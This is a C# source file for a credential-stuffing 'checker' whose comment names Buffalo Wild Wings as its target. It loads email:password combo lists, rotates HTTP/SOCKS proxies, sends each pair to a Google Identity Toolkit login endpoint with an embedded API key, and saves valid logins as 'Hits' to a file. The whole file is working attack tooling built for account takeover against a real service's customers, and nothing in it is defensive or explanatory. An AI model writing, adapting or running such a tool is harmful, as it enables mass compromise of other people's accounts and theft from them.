using System;
using System.Linq;
using System.Drawing;
using System.Threading;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using Console = Colorful.Console;
using Leaf.xNet;
using ConsoleCheckerBase.Utilities;

namespace ConsoleCheckerBase.Checker
{
    internal class Brute
    {
        public static void UpdateInterface()
        {
            for (; ; )
            {
                Variables.CPM = Variables.CPMAux;
                Variables.CPMAux = 0;

                Console.Title = string.Format("[Console Checker Base]" + " ~ Checked: {0}/{1} ~ Hits: {2} ~ Invalid: {3} ~ Errors: {4} ~ Retries: {5} ~ CPM: ", new object[]
                {
                    Variables.Checked,
                    Variables.Total,
                    Variables.Hits,
                    Variables.Invalids,
                    Variables.Errors,
                    Variables.Retries
                }) + Variables.CPM * 60 + " ~ Xarien";
                Thread.Sleep(1000);

                Console.Clear();
                Console.WriteLine();

                Logo.Load();
                Console.WriteLine();

                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Combos Loaded", Color.FromArgb(246, 120, 106));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Total);
                Console.Write(" ~ ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write(Variables.GetComboName, Color.FromArgb(246, 120, 106));
                Console.Write("]", Color.GhostWhite);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Proxies Loaded", Color.FromArgb(239, 150, 120));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.ProxyTotal);
                Console.Write(" ~ ", Color.FromArgb(239, 150, 120));
                Console.Write("[", Color.GhostWhite);
                Console.Write(Variables.ProxyType, Color.FromArgb(239, 150, 120));
                Console.Write("]", Color.GhostWhite);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(249, 153, 102));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Threads", Color.FromArgb(249, 153, 102));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Threads);

                Console.WriteLine();
                Console.WriteLine();

                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Hits", Color.FromArgb(0, 255, 0));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Hits);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Invalids", Color.FromArgb(255, 0, 0));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Invalids);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Errors", Color.FromArgb(255, 244, 86));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Errors);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Retries", Color.FromArgb(157, 69, 201));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.Retries);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("CPM", Color.FromArgb(241, 183, 172));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.CPM * 60);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Latest Hit", Color.FromArgb(251, 211, 211));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(Variables.GetLatestHit);

                Console.WriteLine();
                Console.Write("          ", Color.GhostWhite);
                Console.Write("| ", Color.FromArgb(246, 120, 106));
                Console.Write("[", Color.GhostWhite);
                Console.Write("Checked", Color.FromArgb(252, 225, 225));
                Console.Write("]: ", Color.GhostWhite);
                Console.Write(String.Format("{0}/{1}", new object[]
                {
                    Variables.Checked,
                    Variables.Total
                }));

                Thread.Sleep(100);
                Console.WriteLine();
            }
        }

        // Example checker made for Buffalo Wild Wings - https://www.buffalowildwings.com/, no capture

        public static void Checker()
        {
            for (; ; )
            {
                if (Variables.ProxyIndex > Variables.Proxies.Count<string>() - 2)
                {
                    Variables.ProxyIndex = 0;
                }
                try
                {
                    Interlocked.Increment(ref Variables.ProxyIndex);
                    using (HttpRequest request = new HttpRequest())
                    {
                        if (Variables.AccIndex >= Variables.Combos.Count<string>())
                        {
                            Variables.Stop++;
                            break;
                        }
                        Interlocked.Increment(ref Variables.AccIndex);
                        string[] array = Variables.Combos[Variables.AccIndex].Split(new char[]
                        {
                            ':',
                            ';',
                            '|',
                        });
                        string combo = array[0] + ":" + array[1];
                        try
                        {
                            if (Variables.ProxyType == "HTTP")
                            {
                                request.Proxy = HttpProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                request.Proxy.ConnectTimeout = 5000;
                            }
                            if (Variables.ProxyType == "SOCKS4")
                            {
                                request.Proxy = Socks4ProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                request.Proxy.ConnectTimeout = 5000;
                            }
                            if (Variables.ProxyType == "SOCKS5")
                            {
                                request.Proxy = Socks5ProxyClient.Parse(Variables.Proxies[Variables.ProxyIndex]);
                                request.Proxy.ConnectTimeout = 5000;
                            }
                            request.IgnoreProtocolErrors = true;
                            request.KeepAlive = true;
                            request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36";
                            request.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(request.SslCertificateValidatorCallback, (RemoteCertificateValidationCallback)((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));

                            request.AddHeader("Content-Type", "application/json");
                            request.AddHeader("Accept", "*/*");
                            request.AddHeader("Origin", "https://www.buffalowildwings.com");
                            request.AddHeader("Referer", "https://www.buffalowildwings.com/");
                            request.AddHeader("Accept-Encoding", "gzip, deflate, br");
                            request.AddHeader("Accept-Language", "en-GB,en-US;q=0.9,en;q=0.8");

                            string PostLogin = request.Post("https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyCOwJXQgucG-msfcDWV-qJdRSZz7uDGZNk", string.Concat(new string[]
                            {
                                "{\"email\":\"",
                                array[0],
                                "\",\"password\":\"",
                                array[1],
                                "\",\"returnSecureToken\":true}"
                            }), "application/json").ToString();

                            if (PostLogin.Contains("displayName"))
                            {
                                Variables.CPMAux++;
                                Variables.Checked++;
                                Variables.Hits++;
                                Variables.GetLatestHit = combo;
                                FileManager.Export("Hits", "Hits.txt", combo);
                            }
                            else if (PostLogin.Contains("code\": 400"))
                            {
                                Variables.CPMAux++;
                                Variables.Checked++;
                                Variables.Invalids++;
                            }
                        }
                        catch
                        {
                            Variables.Combos.Add(combo);
                            Variables.Retries++;
                        }
                    }
                }
                catch
                {
                    Interlocked.Increment(ref Variables.Errors);
                    continue;
                }
            }
        }
    }
}
